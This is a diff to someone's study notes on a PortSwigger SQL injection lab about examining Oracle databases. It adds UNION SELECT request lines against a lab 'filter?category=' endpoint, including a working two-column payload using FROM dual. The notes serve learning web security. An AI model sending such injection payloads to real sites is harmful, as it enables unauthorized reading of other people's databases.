@@ -50,7 +50,16 @@ https://portswigger.net/web-security/sql-injection/examining-the-database
 Oracle: SELECT * FROM v$version UNION SELECT * FROM information_schema.tables; schema is just tabled and column info no data just the meta.
 Microsoft, MySQL: 	SELECT @@version 
 PostgreSQL: 	SELECT version() 
-A. 
+A. Oracle 
+Hint: On Oracle databases, every SELECT statement must specify a table to select FROM. If your UNION SELECT attack does not query from a table, you will still need to include the FROM keyword followed by a valid table name. 
+When you UNION you need to return the correct amount of columns and data type this is why belows are failing:
+We have an idea of where the data is at we need to weaponize an exploit: Playing a bit with not enough data
+GET /filter?category=Corporate+gifts' UNION SELECT NULL -- HTTP/1.1   400 bad request
+GET /filter?category=Corporate+gifts HTTP/1.1                         200 Good Request
+GET /filter?category=Corporate+gifts UNION SELECT NULL; HTTP/1.1         400
+GET /filter?category=Corporate+gifts' UNION SELECT NULL;-- HTTP/1.1    400
+Get our column count and type:
+GET /filter?category=Corporate+gifts'+UNION+SELECT+'NULL','NULL'+FROM+dual-- HTTP/1.1   200 OK we have two columns of data. 
 
 4. Blind SQL injection vulnerabilities
 https://portswigger.net/web-security/sql-injection/blind
